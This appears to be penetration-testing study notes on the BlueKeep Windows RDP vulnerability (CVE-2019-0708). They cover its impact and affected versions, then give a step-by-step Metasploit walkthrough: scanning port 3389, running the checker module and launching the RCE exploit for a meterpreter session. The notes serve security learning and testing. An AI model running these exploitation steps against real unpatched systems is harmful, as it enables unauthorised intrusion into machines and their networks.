> BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in
  Windows that could potentially allow attackers to remotely execute arbitrary
  code and gain access to a Windows system and consequently the network that
  the target system is a part of.
> The BlueKeep vulnerability was made public by Microsoft in May 2019.
> The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP
  protocol that allows attackers to gain access to a chunk of kernel memory
  consequently allowing them to remotely execute arbitrary code at the system
  level without authentication.
  
> Microsoft released a patch for this vulnerability on May 14th, 2019 and has
  urged companies to patch this vulnerability as soon as possible.
> At the time of discovery, about 1 million systems worldwide were found to be
  vulnerable.
> The BlueKeep vulnerability affects multiple versions of Windows:
  > XP
  > Vista
  > Windows 7
  > Windows Server 2008 & R2
  
Exploiting BlueKeep:

> The BlueKeep vulnerability has various illegitimate PoCâ€™s and exploit code that could
  be malicious in nature. It is therefore recommended to only utilize verified exploit
  code and modules for exploitation.
> The BlueKeep exploit has an MSF auxiliary module that can be used to check if a
  target system if vulnerable to the exploit and also has an exploit module that can be
  used to exploit the vulnerability on unpatched systems.
> The BlueKeep exploit module can be used to exploit vulnerable Windows systems
  and consequently provide us with a privileged meterpreter session on the target
  system.
  Note: Targeting Kernel space memory and applications can cause system crashes.
  
> nmap -p 3389 <IP>
> msfconsole -q
  > search bluekeep
    > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
      > set RHOSTS <IP>
      > set RPORT if needed
      > run
    > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
      > ONLY x64
      > set RHOSTS
      > set RPORT if needed
      > set LHOST
      > set LPORT
      > show targets
        > set target <ID>
      > run
      > if exploit fails, set size of payload
        > set GROOMSIZE <VALUE>
